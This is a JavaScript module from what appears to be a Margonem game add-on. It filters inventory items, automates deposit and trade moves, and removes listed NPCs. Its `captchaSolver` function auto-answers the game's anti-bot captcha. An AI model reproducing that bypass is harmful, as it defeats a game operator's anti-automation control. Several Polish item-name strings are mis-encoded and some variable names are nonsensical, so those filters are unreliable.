export function clearEntity() {
  const npcIdsToRemove = [127406, 127396, 127411, 127416, 127421, 127426, 127431, 127434, 127401, 127402, 127403, 127404, 127405, 127370, 127371, 127372, 127373, 127374, 127375, 127376, 127377, 127378, 127379, 127382, 127383, 127384, 127385, 127386, 127391, 127392, 127393, 127394, 127395, 214424];
  npcIdsToRemove.forEach(targetNpcId => {
    try {
      const npcInstance = Engine.npcs.getById(targetNpcId);

      if (!npcInstance) {
        return;
      }

      try {
        npcInstance.delete();
      } catch (npcDeleteError) {
        console.error("Nie udało się usunąć NPC " + targetNpcId + ":", npcDeleteError);
      }
    } catch (npcFetchError) {
      console.error("Błąd getById dla " + targetNpcId + ":", npcFetchError);
    }
  });
}
export async function captchaSolver(captchaItems) {
  const captchaAnswersString = captchaItems.map((captchaCell, captchaIndex) => {
    if (captchaCell.startsWith("*") && captchaCell.endsWith("*")) {
      return captchaIndex;
    }

    return null;
  }).filter(filteredIdx => filteredIdx !== null).join(",");
  await waitForSeconds(3);

  _g("captcha&answerId=" + captchaAnswersString, function (captchaResponse) {
    if (captchaResponse.captcha.done) {
      log("Zagadka rozwiązana: " + captchaAnswersString);
    }
  });
}
export function calculateUnbindCost(baseUnbindCost, rarityTier) {
  baseUnbindCost = Math.round(baseUnbindCost);
  let scaledCostMultiplier = 10 + baseUnbindCost * 0.1;

  if (rarityTier == 1) {
    if (Math.round(scaledCostMultiplier) > 20) {
      return 1500;
    }

    return Math.round(scaledCostMultiplier) * 75;
  }

  if (rarityTier == 2) {
    if (scaledCostMultiplier >= 20) {
      return 1800;
    }

    return Math.round(scaledCostMultiplier * 1.2) * 75;
  }

  if (rarityTier == 3) {
    if (scaledCostMultiplier >= 30) {
      return 3375;
    }

    return Math.round(scaledCostMultiplier * 1.5) * 75;
  }

  if (rarityTier == 4) {
    if (scaledCostMultiplier >= 30) {
      return 6750;
    }

    return Math.round(scaledCostMultiplier * 3) * 75;
  }
}
export function showReminder(reminderMsg, reminderDuration, reminderTitle = "PRZYPOMNIENIE") {
  let reminderTimeoutId;
  const alertAudio = new Audio("https://margoplus.pl/audio/colossus-alert.mp3");
  alertAudio.volume = 0.5;
  alertAudio.play();
  const reminderOverlayElement = $("<div class=\"mp-overlay-reminder\">\n      <div class=\"mp-overlay-reminder-box\">\n        <div class=\"mp-overlay-reminder-header\">" + reminderTitle + "</div>\n        <div class=\"mp-overlay-reminder-text\">" + reminderMsg + "</div>\n      </div>\n  </div>\n  ").appendTo("#mp-root");
  reminderTimeoutId = setTimeout(() => {
    reminderOverlayElement?.fadeOut(500, function () {
      $(this).remove();
    });
  }, 3000);
}
export function removeAnvil() {
  $(".mp-scene")?.fadeOut(500, function () {
    $(this).remove();
  });
}
export function spawnAnvil() {
  $(".mp-scene")?.remove();
  const gameLayerContainer = document.querySelector(".game-layer");
  const sceneWrapper = document.createElement("div");
  sceneWrapper.className = "mp-scene";
  const anvilElement = document.createElement("div");
  anvilElement.className = "mp-anvil";
  const hammerElement = document.createElement("div");
  hammerElement.className = "mp-hammer";
  sceneWrapper.appendChild(anvilElement);
  anvilElement.appendChild(hammerElement);
  gameLayerContainer.appendChild(sceneWrapper);
}
export function addAnimatedBadge2(lootWrapperId, finalPercentage) {
  const itemWrapperDom = document.querySelector(".loot-item-wrapper-" + lootWrapperId);

  if (!itemWrapperDom) {
    return;
  }

  const animatedBadgeElement = document.createElement("div");
  animatedBadgeElement.className = "animated-badge slot-roll";
  itemWrapperDom.prepend(animatedBadgeElement);
  let randomBadgeValue = 0;
  let animationTickInterval = 20;
  let ticksElapsed = 0;
  const maxAnimationTicks = 20;
  const badgeIntervalId = setInterval(() => {
    randomBadgeValue = Math.floor(Math.random() * 100);
    animatedBadgeElement.textContent = randomBadgeValue + "%";
    ticksElapsed++;

    if (ticksElapsed > maxAnimationTicks * 0.6) {
      animationTickInterval += 15;
      clearInterval(badgeIntervalId);
      setTimeout(executeFinalRollPhase, animationTickInterval);
    }

    if (ticksElapsed >= maxAnimationTicks) {
      clearInterval(badgeIntervalId);
      renderFinalResultBadge();
    }
  }, animationTickInterval);

  function executeFinalRollPhase() {
    const finalRollIntervalId = setInterval(() => {
      randomBadgeValue = Math.floor(Math.random() * 100);
      animatedBadgeElement.textContent = randomBadgeValue + "%";
    }, animationTickInterval);
    setTimeout(() => {
      clearInterval(finalRollIntervalId);
      renderFinalResultBadge();
    }, 2000);
  }

  function renderFinalResultBadge() {
    animatedBadgeElement.textContent = finalPercentage + "%";
    const numericRollValue = Number(finalPercentage);
    const rollClassMap = {
      "0": "slot-lost",
      "100": "slot-win"
    };
    animatedBadgeElement.classList.add(rollClassMap[numericRollValue] ?? (numericRollValue > 0 && numericRollValue < 100 ? "slot-remis" : ""));
  }
}
export function parseChangeToGetLegendary(itemProfRequirements, validProfessionsList) {
  if (!Array.isArray(validProfessionsList) || validProfessionsList.length === 0) {
    return 0;
  }

  const heroProfession = Engine.hero.d.prof;
  const splitReqLetters = itemProfRequirements?.split("") || [];
  const hasMatchingProf = splitReqLetters.some(currentProfLetter => validProfessionsList.includes(currentProfLetter));
  let matchingProfCount = 0;

  if (hasMatchingProf) {
    if (!itemProfRequirements?.includes(heroProfession)) {
      return 0;
    }

    for (let letterIterator of splitReqLetters) {
      matchingProfCount += validProfessionsList.filter(filterMatch => filterMatch === letterIterator).length;
    }
  } else {
    matchingProfCount = validProfessionsList.length;
  }

  if (matchingProfCount === 0) {
    return 0;
  }

  if (itemProfRequirements?.includes(heroProfession) && matchingProfCount === 1) {
    return 100;
  }

  return Math.floor(100 / matchingProfCount);
}
export function addAnimatedBadge(targetBadgeItemId, badgeTextContent) {
  const targetBadgeWrapper = document.querySelector(".loot-item-wrapper-" + targetBadgeItemId);

  if (!targetBadgeWrapper) {
    return;
  }

  const staticBadgeElement = document.createElement("div");
  staticBadgeElement.className = "animated-badge";
  staticBadgeElement.textContent = badgeTextContent;
  targetBadgeWrapper.prepend(staticBadgeElement);
}

const gAsync = networkQueryString => new Promise(promiseResolve => _g(networkQueryString, promiseResolve));

const isInCurrentTab = depoItemToCheck => {
  const visibleDepoTabIdx = Engine.depo.getVisible();
  const tabWidthMultiplier = 14;
  const tabMinBoundX = visibleDepoTabIdx < 8 ? visibleDepoTabIdx * tabWidthMultiplier : (visibleDepoTabIdx - 8) * tabWidthMultiplier;
  const tabMaxBoundX = tabMinBoundX + 13;
  const tabMinBoundY = visibleDepoTabIdx < 8 ? 0 : 8;
  const tabMaxBoundY = visibleDepoTabIdx < 8 ? 7 : 15;
  return depoItemToCheck.x >= tabMinBoundX && depoItemToCheck.x <= tabMaxBoundX && depoItemToCheck.y >= tabMinBoundY && depoItemToCheck.y <= tabMaxBoundY;
};

const filterItems = (locationCode, itemFilteringCallback) => Engine.items.fetchLocationItems(locationCode).filter(itemFilteringCallback);

const processItems = async (itemsQueueList, itemProcessingCallback, queueThrottleDelay = 0.05) => {
  for (const queueIteratorItem of itemsQueueList) {
    const itemProcessResult = await itemProcessingCallback(queueIteratorItem);
    await waitForSeconds(itemProcessResult ? queueThrottleDelay : 0.1);
  }

  $(".ess-selected").removeClass("ess-selected");
};

const listNuggets = ["Wykrywacz herosĂłw", "Zwój orzeźwienia", "Złoty samorodek", "Podwójne widzenie", "Leczenie w walce", "Kupon na małą miksturę wyczerpania", "Kupon na miksturÄ wyczerpania", "Kupon na duĹźÄ miksturę wyczerpania", "Zwój wywołania depozytu", "Zwój wywołania poczty", "Zwój wywołania aukcji", "Zwój wywołania depozytu klanowego", "Zwój zbiega", "ZwĂłj wywoĹania sklepu", "Pieśń przebudzenia", "Melodia wieków", "Diabelskie struny", "Werble ochronne", "Elfia kołysanka", "Rozkaz bojowy", "Fletnia opiekuna lasĂłw", "Zaklęte kastaniety", "Ulga dla przeciÄĹźonych", "Utrwalenie stroju", "Utrwalenie chowańca", "Doskonała skrzynia Smoczych Kowali", "Modyfikator celu podróży", "Poszerzacz depozytu", "Plecak mistrza teleportacji", "Pożeracz doświadczenia", "Poszerzacz zestawów do walki", "Unikatowy blankiet na strój", "Heroiczny blankiet na strĂłj"];
export const getItemsFromDepoAllByNugget = () => filterItems("d", blessingItem => blessingItem.st == 0 && !blessingItem._cachedStats.hasOwnProperty("nodepo") && listNuggets.indexOf(blessingItem.name) >= 0);
export const getItemsFromDepoTabByNugget = () => filterItems("d", blessingTabItem => blessingTabItem.st == 0 && !blessingTabItem._cachedStats.hasOwnProperty("nodepo") && listNuggets.indexOf(blessingTabItem.name) >= 0 && isInCurrentTab(blessingTabItem));
export const getItemsFromEqByNugget = () => filterItems("g", blessingEqItem => blessingEqItem.st == 0 && !blessingEqItem._cachedStats.hasOwnProperty("nodepo") && listNuggets.indexOf(blessingEqItem.name) >= 0);
export const getItemsFromTabByName = targetItemNameKey => filterItems("d", matchedTabItem => matchedTabItem.st == 0 && matchedTabItem.name === targetItemNameKey && isInCurrentTab(matchedTabItem) && !matchedTabItem._cachedStats.hasOwnProperty("nodepo") && !matchedTabItem._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));
export const getItemsFromAllByName = allSearchNameKey => filterItems("d", matchedAllItem => matchedAllItem.st == 0 && matchedAllItem.name === allSearchNameKey && !matchedAllItem._cachedStats.hasOwnProperty("nodepo") && !matchedAllItem._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));
export const getItemsFromDepoAllByType = (clGroupIdx, targetRarityType, filterConfigObj) => filterItems("d", depoFilteredItem => depoFilteredItem.st === 0 && validateItemsForType(targetRarityType, filterConfigObj, depoFilteredItem) && getClGroup(depoFilteredItem.cl) == clGroupIdx);
export const getItemsFromDepoTabByType = (clGroupTabIdx, targetRarityTabType, filterConfigTabObj) => filterItems("d", depoTabFilteredItem => depoTabFilteredItem.st === 0 && validateItemsForType(targetRarityTabType, filterConfigTabObj, depoTabFilteredItem) && getClGroup(depoTabFilteredItem.cl) == clGroupTabIdx && isInCurrentTab(depoTabFilteredItem));
export const getItemsFromEqByType = (clGroupEqIdx, targetRarityEqType, filterConfigEqObj) => filterItems("g", eqFilteredItem => eqFilteredItem.st === 0 && validateItemsForType(targetRarityEqType, filterConfigEqObj, eqFilteredItem) && getClGroup(eqFilteredItem.cl) == clGroupEqIdx && isInCurrentTab(eqFilteredItem));
const blessStatsBonusHandlers = {
  npc_lootbon: lootBonCheck => lootBonCheck.npc_lootbon,
  quest_expbon: questExpCheck => questExpCheck.quest_expbon,
  npc_expbon: npcExpCheck => npcExpCheck.npc_expbon,
  honorbon: honorBonCheck => honorBonCheck.honorbon
};
const bonusMap = blessStatsBonusHandlers;
export const getItemsFromDepoAllByBlessBonus = allBlessBonusType => filterItems("d", blessAllMatchedItem => blessAllMatchedItem.st === 0 && !blessAllMatchedItem._cachedStats.hasOwnProperty("nodepo") && blessAllMatchedItem.cl === 25 && (blessAllMatchedItem._cachedStats.legbon?.includes(allBlessBonusType) || bonusMap[allBlessBonusType]?.(blessAllMatchedItem._cachedStats)));
export const getItemsFromDepoTabByBlessBonus = tabBlessBonusType => filterItems("d", blessTabMatchedItem => blessTabMatchedItem.st === 0 && !blessTabMatchedItem._cachedStats.hasOwnProperty("nodepo") && blessTabMatchedItem.cl === 25 && (blessTabMatchedItem._cachedStats.legbon?.includes(tabBlessBonusType) || bonusMap[tabBlessBonusType]?.(blessTabMatchedItem._cachedStats)) && isInCurrentTab(blessTabMatchedItem));
export const getItemsFromEqByBlessBonus = eqBlessBonusType => filterItems("g", blessEqMatchedItem => blessEqMatchedItem.st === 0 && !blessEqMatchedItem._cachedStats.hasOwnProperty("nodepo") && blessEqMatchedItem.cl === 25 && (blessEqMatchedItem._cachedStats.legbon?.includes(eqBlessBonusType) || bonusMap[eqBlessBonusType]?.(blessEqMatchedItem._cachedStats)));
export const getItemsFromDepoAllByComponentsTier1 = () => filterItems("d", t1DepoAllItem => t1DepoAllItem.st == 0 && !t1DepoAllItem._cachedStats.hasOwnProperty("nodepo") && (t1DepoAllItem._cachedStats.opis?.includes("poziomie 20-100") || (t1DepoAllItem.cl === 28 || t1DepoAllItem.cl === 26) && t1DepoAllItem._cachedStats?.target_min_lvl == 20));
export const getItemsFromDepoAllByComponentsTier2 = () => filterItems("d", t2DepoAllItem => t2DepoAllItem.st == 0 && !t2DepoAllItem._cachedStats.hasOwnProperty("nodepo") && (t2DepoAllItem._cachedStats.opis?.includes("poziomie 101-200") || (t2DepoAllItem.cl === 28 || t2DepoAllItem.cl === 26) && t2DepoAllItem._cachedStats?.target_min_lvl == 101));
export const getItemsFromDepoAllByComponentsTier3 = () => filterItems("d", t3DepoAllItem => t3DepoAllItem.st == 0 && !t3DepoAllItem._cachedStats.hasOwnProperty("nodepo") && (t3DepoAllItem._cachedStats.opis?.includes("poziomie 201-300") || (t3DepoAllItem.cl === 28 || t3DepoAllItem.cl === 26) && t3DepoAllItem._cachedStats?.target_min_lvl == 201));
export const getItemsFromDepoTabByComponentsTier1 = () => filterItems("d", t1DepoTabItem => t1DepoTabItem.st == 0 && isInCurrentTab(t1DepoTabItem) && !t1DepoTabItem._cachedStats.hasOwnProperty("nodepo") && (t1DepoTabItem._cachedStats.opis?.includes("poziomie 20-100") || (t1DepoTabItem.cl === 28 || t1DepoTabItem.cl === 26) && t1DepoTabItem._cachedStats?.target_min_lvl == 20));
export const getItemsFromDepoTabByComponentsTier2 = () => filterItems("d", t2DepoTabItem => t2DepoTabItem.st == 0 && isInCurrentTab(t2DepoTabItem) && !t2DepoTabItem._cachedStats.hasOwnProperty("nodepo") && (t2DepoTabItem._cachedStats.opis?.includes("poziomie 101-200") || (t2DepoTabItem.cl === 28 || t2DepoTabItem.cl === 26) && t2DepoTabItem._cachedStats?.target_min_lvl == 101));
export const getItemsFromDepoTabByComponentsTier3 = () => filterItems("d", t3DepoTabItem => t3DepoTabItem.st == 0 && isInCurrentTab(t3DepoTabItem) && !t3DepoTabItem._cachedStats.hasOwnProperty("nodepo") && (t3DepoTabItem._cachedStats.opis?.includes("poziomie 201-300") || (t3DepoTabItem.cl === 28 || t3DepoTabItem.cl === 26) && t3DepoTabItem._cachedStats?.target_min_lvl == 201));
export const getItemsFromEqByComponentsTier1 = () => filterItems("g", t1EqItem => t1EqItem.st == 0 && !t1EqItem._cachedStats.hasOwnProperty("nodepo") && (t1EqItem._cachedStats.opis?.includes("poziomie 20-100") || (t1EqItem.cl === 28 || t1EqItem.cl === 26) && t1EqItem._cachedStats?.target_min_lvl == 20));
export const getItemsFromEqByComponentsTier2 = () => filterItems("g", t2EqItem => t2EqItem.st == 0 && !t2EqItem._cachedStats.hasOwnProperty("nodepo") && (t2EqItem._cachedStats.opis?.includes("poziomie 101-200") || (t2EqItem.cl === 28 || t2EqItem.cl === 26) && t2EqItem._cachedStats?.target_min_lvl == 101));
export const getItemsFromEqByComponentsTier3 = () => filterItems("g", t3EqItem => t3EqItem.st == 0 && !t3EqItem._cachedStats.hasOwnProperty("nodepo") && (t3EqItem._cachedStats.opis?.includes("poziomie 201-300") || (t3EqItem.cl === 28 || t3EqItem.cl === 26) && t3EqItem._cachedStats?.target_min_lvl == 201));
export const getItemsFromDepoTabByChest = () => filterItems("d", outfitChestTabItem => outfitChestTabItem.st == 0 && !outfitChestTabItem._cachedStats.hasOwnProperty("nodepo") && outfitChestTabItem._cachedStats.opis?.includes("Zawiera jedną losową część przebrania") && isInCurrentTab(outfitChestTabItem));
export const getItemsFromDepoAllByChest = () => filterItems("d", outfitChestAllItem => outfitChestAllItem.st == 0 && !outfitChestAllItem._cachedStats.hasOwnProperty("nodepo") && outfitChestAllItem._cachedStats.opis?.includes("Zawiera jedną losową część przebrania"));
export const getItemsFromEqByChest = () => filterItems("g", outfitChestEqItem => outfitChestEqItem.st == 0 && !outfitChestEqItem._cachedStats.hasOwnProperty("nodepo") && outfitChestEqItem._cachedStats.opis?.includes("Zawiera jednÄ losowÄ część przebrania"));
export const getItemsFromDepoAllBySkinItems = () => filterItems("d", skinLegendaryAllItem => skinLegendaryAllItem.st == 0 && !skinLegendaryAllItem._cachedStats.hasOwnProperty("nodepo") && skinLegendaryAllItem._cachedStats.opis?.includes("legendarnego stroju"));
export const getItemsFromDepoTabBySkinItems = () => filterItems("d", skinLegendaryTabItem => skinLegendaryTabItem.st == 0 && !skinLegendaryTabItem._cachedStats.hasOwnProperty("nodepo") && skinLegendaryTabItem._cachedStats.opis?.includes("legendarnego stroju") && isInCurrentTab(skinLegendaryTabItem));
export const getItemsFromEqBySkinItems = () => filterItems("g", skinLegendaryEqItem => skinLegendaryEqItem.st == 0 && !skinLegendaryEqItem._cachedStats.hasOwnProperty("nodepo") && skinLegendaryEqItem._cachedStats.opis?.includes("legendarnego stroju"));
export const getItemsFromDepoAllByCoupon = () => filterItems("d", couponAllItem => couponAllItem.st == 0 && !couponAllItem._cachedStats.hasOwnProperty("nodepo") && (couponAllItem._cachedStats.opis?.includes("Kupon") || couponAllItem.name.includes("kupon")));
export const getItemsFromDepoTabByCoupon = () => filterItems("d", couponTabItem => couponTabItem.st == 0 && !couponTabItem._cachedStats.hasOwnProperty("nodepo") && (couponTabItem._cachedStats.opis?.includes("Kupon") || couponTabItem.name.includes("kupon")) && isInCurrentTab(couponTabItem));
export const getItemsFromEqByCoupon = () => filterItems("g", couponEqItem => couponEqItem.st == 0 && !couponEqItem._cachedStats.hasOwnProperty("nodepo") && (couponEqItem._cachedStats.opis?.includes("Kupon") || couponEqItem.name.includes("kupon")));
export const getItemsFromDepoAllByExp = () => filterItems("d", expAddAllItem => expAddAllItem.st == 0 && expAddAllItem._cachedStats.expadd);
export const getItemsFromDepoTabByExp = () => filterItems("d", expAddTabItem => expAddTabItem.st == 0 && !expAddTabItem._cachedStats.hasOwnProperty("nodepo") && expAddTabItem._cachedStats.expadd && isInCurrentTab(expAddTabItem));
export const getItemsFromEqByExp = () => filterItems("g", expAddEqItem => expAddEqItem.st == 0 && !expAddEqItem._cachedStats.hasOwnProperty("nodepo") && expAddEqItem._cachedStats.expadd);
export const getItemsFromDepoAllByPkt = () => filterItems("d", pointsAddAllItem => pointsAddAllItem.st == 0 && !pointsAddAllItem._cachedStats.hasOwnProperty("nodepo") && pointsAddAllItem._cachedStats.hasOwnProperty("enhancement_add_point"));
export const getItemsFromDepoTabByPkt = () => filterItems("d", pointsAddTabItem => pointsAddTabItem.st == 0 && !pointsAddTabItem._cachedStats.hasOwnProperty("nodepo") && pointsAddTabItem._cachedStats.hasOwnProperty("enhancement_add_point") && isInCurrentTab(pointsAddTabItem));
export const getItemsFromEqByPkt = () => filterItems("g", pointsAddEqItem => pointsAddEqItem.st == 0 && !pointsAddEqItem._cachedStats.hasOwnProperty("nodepo") && pointsAddEqItem._cachedStats.hasOwnProperty("enhancement_add_point"));
export const getItemsFromDepoAllByDust = () => filterItems("d", astralDustAllItem => astralDustAllItem.st == 0 && !astralDustAllItem._cachedStats.hasOwnProperty("nodepo") && (astralDustAllItem._cachedStats.hasOwnProperty("upgtimelimit") || astralDustAllItem._cachedStats?.opis?.includes("pyłu astralnego")));
export const getItemsFromDepoTabByDust = () => filterItems("d", astralDustTabItem => astralDustTabItem.st == 0 && !astralDustTabItem._cachedStats.hasOwnProperty("nodepo") && (astralDustTabItem._cachedStats.hasOwnProperty("upgtimelimit") || astralDustTabItem._cachedStats.opis?.includes("pyĹu astralnego")) && isInCurrentTab(astralDustTabItem));
export const getItemsFromEqByDust = () => filterItems("g", astralDustEqItem => astralDustEqItem.st == 0 && !astralDustEqItem._cachedStats.hasOwnProperty("nodepo") && (astralDustEqItem._cachedStats.hasOwnProperty("upgtimelimit") || astralDustEqItem._cachedStats.opis?.includes("pyłu astralnego")));
export const getItemsFromDepoAllByExpiries = () => {
  const currentTimestampSeconds = Math.ceil(ts() / 1000);
  return filterItems("d", expiredAllItem => expiredAllItem.st == 0 && !expiredAllItem._cachedStats.hasOwnProperty("nodepo") && expiredAllItem._cachedStats.expires && currentTimestampSeconds > expiredAllItem._cachedStats.expires);
};
export const getItemsFromDepoTabByExpiries = () => {
  const currentTimestampSecTab = Math.ceil(ts() / 1000);
  return filterItems("d", expiredTabItem => expiredTabItem.st == 0 && !expiredTabItem._cachedStats.hasOwnProperty("nodepo") && expiredTabItem._cachedStats.expires && currentTimestampSecTab > expiredTabItem._cachedStats.expires && isInCurrentTab(expiredTabItem));
};
export const getItemsFromEqByExpiries = () => {
  const currentTimestampSecEq = Math.ceil(ts() / 1000);
  return filterItems("g", expiredEqItem => expiredEqItem.st == 0 && !expiredEqItem._cachedStats.hasOwnProperty("nodepo") && expiredEqItem._cachedStats.expires && currentTimestampSecEq > expiredEqItem._cachedStats.expires && !expiredEqItem._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));
};
export const getItemsFromEqByName = targetSearchName => filterItems("g", matchedEqNameItem => matchedEqNameItem.name === targetSearchName && matchedEqNameItem.st === 0 && !matchedEqNameItem._cachedStats.hasOwnProperty("nodepo") && !matchedEqNameItem._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));

const validateItems = (requiredValidationRarity, validationRulesConfig, itemToValidate) => {
  const validatedCachedStats = itemToValidate._cachedStats;

  if (!validatedCachedStats) {
    return false;
  }

  if (validatedCachedStats.rarity !== requiredValidationRarity) {
    return false;
  }

  if ([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29].indexOf(itemToValidate.cl) >= 0 && !validationRulesConfig.other.eq) {
    return false;
  }

  if (validationRulesConfig?.cl?.hasOwnProperty(itemToValidate.cl) && !validationRulesConfig.cl[itemToValidate.cl]) {
    return false;
  }

  const itemDescriptionLowercase = validatedCachedStats?.opis?.toLowerCase() ?? "";

  if (itemDescriptionLowercase?.includes("event") && !validationRulesConfig.other.lic) {
    return false;
  }

  if (itemDescriptionLowercase?.includes("kopalnia") && !validationRulesConfig.other.kopa) {
    return false;
  }

  if (validatedCachedStats.hasOwnProperty("nodepo")) {
    return false;
  }

  if (validatedCachedStats.hasOwnProperty("enhancement_upgrade_lvl")) {
    return false;
  }

  if (validatedCachedStats.hasOwnProperty("soulbound") && !validationRulesConfig.bind) {
    return false;
  }

  if (validatedCachedStats.hasOwnProperty("permbound") && !validationRulesConfig.bind) {
    return false;
  }

  return true;
};

const validateItemsForType = (typeValidationRarity, typeRulesConfig, typeItemToValidate) => {
  const typeCachedStats = typeItemToValidate._cachedStats;

  if (!typeCachedStats) {
    return false;
  }

  if (typeCachedStats.rarity !== typeValidationRarity) {
    return false;
  }

  if ([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29].indexOf(typeItemToValidate.cl) < 0) {
    return false;
  }

  const typeDescriptionLowercase = typeCachedStats?.opis?.toLowerCase() ?? "";

  if (typeDescriptionLowercase?.includes("event") && !typeRulesConfig.other.lic) {
    return false;
  }

  if (typeDescriptionLowercase?.includes("kopalnia") && !typeRulesConfig.other.kopa) {
    return false;
  }

  if (typeCachedStats.hasOwnProperty("nodepo")) {
    return false;
  }

  if (typeCachedStats.hasOwnProperty("enhancement_upgrade_lvl")) {
    return false;
  }

  if (typeCachedStats.hasOwnProperty("soulbound") && !typeRulesConfig.bind) {
    return false;
  }

  if (typeCachedStats.hasOwnProperty("permbound") && !typeRulesConfig.bind) {
    return false;
  }

  return true;
};

export const getItemArrayFromLocWithValid = (locationCodeKey, lookupRarity, lookupConfig) => {
  const locationItemsPool = Engine.items.fetchLocationItems(locationCodeKey);
  let validItemIdsList = [];

  for (const poolIteratorItem of locationItemsPool) {
    if (locationCodeKey == "d" && validateItems(lookupRarity, lookupConfig, poolIteratorItem) && poolIteratorItem.st == 0 && (!lookupConfig.tab || isInCurrentTab(poolIteratorItem))) {
      validItemIdsList.push(poolIteratorItem.id);
    }

    if (locationCodeKey == "g" && validateItems(lookupRarity, lookupConfig, poolIteratorItem) && poolIteratorItem.st == 0) {
      validItemIdsList.push(poolIteratorItem.id);
    }
  }

  return validItemIdsList;
};
export const depoItemPutGeneric = async (putItemId, putSuccessCallback = () => {}) => {
  const activeDepoTab = Engine.depo.getVisible();
  const depoGridItemTable = Engine.depo.getDepoItemTable();
  const depoTabCapacities = Engine.depo.getCardItems();

  if (depoTabCapacities[activeDepoTab] > 111) {
    return message("Brak miejsca w tej zakładce");
  }

  const minTabGridX = activeDepoTab < 8 ? activeDepoTab * 14 : (activeDepoTab - 8) * 14;
  const maxTabGridX = minTabGridX + 13;
  const minTabGridY = activeDepoTab < 8 ? 0 : 8;
  const maxTabGridY = activeDepoTab < 8 ? 7 : 15;

  for (let gridIteratorY = minTabGridY; gridIteratorY <= maxTabGridY; gridIteratorY++) {
    for (let gridIteratorX = minTabGridX; gridIteratorX <= maxTabGridX; gridIteratorX++) {
      if (!depoGridItemTable[gridIteratorX] || !depoGridItemTable[gridIteratorX][gridIteratorY]) {
        const depoNetworkResponse = await gAsync("depo&put=" + putItemId + "&x=" + gridIteratorX + "&y=" + gridIteratorY + "&answer=1");

        if (depoNetworkResponse.item) {
          await putSuccessCallback();
        }

        return;
      }
    }
  }
};
export const enhancementOnClickReagent = async reagentItemObject => {
  try {
    Engine.crafting.enhancement.enchant.onClickReagent(reagentItemObject);
  } catch (enchantmentIgnoreError) {}
};
export const getSlots = () => {
  return Engine.bags[0][0] - Engine.bags[0][1] + Engine.bags[1][0] - Engine.bags[1][1] + Engine.bags[2][0] - Engine.bags[2][1];
};
export const startPutItems = async (putItemsBatchPool, putActionDelegate = depoItemPutGeneric) => await processItems(putItemsBatchPool, async putBatchIteratorItem => {
  const putActiveTabIdx = Engine.depo.getVisible();
  const putTabCapacities = Engine.depo.getCardItems();

  if (putTabCapacities[putActiveTabIdx] > 111) {
    message("Brak miejsca w tej zakładce");
    return false;
  }

  await putActionDelegate(putBatchIteratorItem);
  return true;
});
export const startGetItems = async getItemsBatchPool => await processItems(getItemsBatchPool, async getBatchIteratorItem => {
  if (getSlots() < 1) {
    message("Brak miejsca w torbach");
    return false;
  }

  const getItemNetworkResponse = await gAsync("depo&get=" + getBatchIteratorItem);
  return !!getItemNetworkResponse.item;
});
export const startPutEnhacement = async enchantItemsBatchPool => await processItems(enchantItemsBatchPool, async enchantBatchIteratorItem => {
  const enchantItemData = Engine.items.getItemById(enchantBatchIteratorItem);
  await enhancementOnClickReagent(enchantItemData);
  return true;
});
export const startGetEnhacement = startPutEnhacement;
export const startPutTrade = async tradeItemsBatchPool => await processItems(tradeItemsBatchPool, async tradeBatchIteratorItem => {
  const tradeItemData = Engine.items.getItemById(tradeBatchIteratorItem);
  await Engine.trade.setSellItem(tradeItemData);
  return true;
});
export const startGetTrade = async tradeRemoveBatchPool => await processItems(tradeRemoveBatchPool, async tradeRemoveIteratorItem => {
  const tradeRemoveNetworkResponse = await gAsync("trade&a=del&tid=" + tradeRemoveIteratorItem);

  if (tradeRemoveNetworkResponse.item) {
    Engine.trade.removeTradeItem(tradeRemoveIteratorItem);
  }

  return !!tradeRemoveNetworkResponse.item;
});
export const startGetSelect = async selectItemsBatchPool => await processItems(selectItemsBatchPool, async selectBatchIteratorItem => {
  if (getSlots() < 1) {
    message("Brak miejsca w torbach");
    return false;
  }

  const selectItemNetworkResponse = await gAsync("depo&get=" + selectBatchIteratorItem);
  return !!selectItemNetworkResponse.item;
});
export const startPutSelect = async selectPutBatchPool => await processItems(selectPutBatchPool, async selectPutIteratorItem => await depoItemPutGeneric(selectPutIteratorItem));
export const countNickData = (othersPlayersMap, partyConfig) => {
  const playerAnalyticsRegistry = {};

  for (let analyticsPlayerId in othersPlayersMap) {
    const playerInstance = othersPlayersMap[analyticsPlayerId];
    const playerNickname = playerInstance.getNick();

    if (!playerAnalyticsRegistry[playerNickname]) {
      playerAnalyticsRegistry[playerNickname] = {
        check: 0,
        all: 0
      };
    }

    playerAnalyticsRegistry[playerNickname].all++;

    if (playerInstance.rx < 0 && playerInstance.ry < 0) {
      playerAnalyticsRegistry[playerNickname].check++;
    }
  }

  return playerAnalyticsRegistry[partyConfig];
};
export const findNearestPointWithinRadius = (spotConfigId, spotPlayerAnalytics, analyticsGroupInstance) => {
  let analyticsGroupPlayerNickname = null;
  let activeGroupRegistry = analyticsGroupInstance * analyticsGroupInstance;
  let activeGroupIteratorId = 0;

  for (let activeGroupPlayer in spotConfigId) {
    const activeGroupPlayerNick = spotConfigId[activeGroupPlayer];
    const spottersConfig = activeGroupPlayerNick.getKind();

    if (spottersConfig === 0 && activeGroupPlayerNick.rx >= 0 && activeGroupPlayerNick.ry >= 0) {
      activeGroupIteratorId++;
      const localStorageConfig = activeGroupPlayerNick.rx - spotPlayerAnalytics.x;
      const parsedConfigObject = activeGroupPlayerNick.ry - spotPlayerAnalytics.y;
      const configKey = localStorageConfig * localStorageConfig + parsedConfigObject * parsedConfigObject;

      if (configKey <= activeGroupRegistry) {
        analyticsGroupPlayerNickname = activeGroupPlayerNick;
        activeGroupRegistry = configKey;
      }
    }
  }

  return analyticsGroupPlayerNickname;
};
const BLESS_KEYS = [["npc_lootbon", "LOOT"], ["quest_expbon", "QUE"], ["npc_expbon", "EXP"], ["honorbon", "PH"]];
const DMG_KEYS = ["fire", "frost", "wound", "light", "poison"];
const LEVEL_CLASSES = new Set([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29]);
const REMOVE_SELECTOR = ".mp-label-legbon, .mp-label-upgrade-level, .mp-label-bless,.mp-label-level, .mp-label-healing, .mp-label-damage, .mp-label-comp";
const COMP_TIERS = {
  "20": "T1",
  "101": "T2",
  "201": "T3"
};
export function createLabelsItems(spotWidgetId, spotWidgetElement, widgetHasActiveIcon = false) {
  if (!spotWidgetId?._cachedStats) {
    return;
  }

  const widgetStateConfig = spotWidgetId._cachedStats;
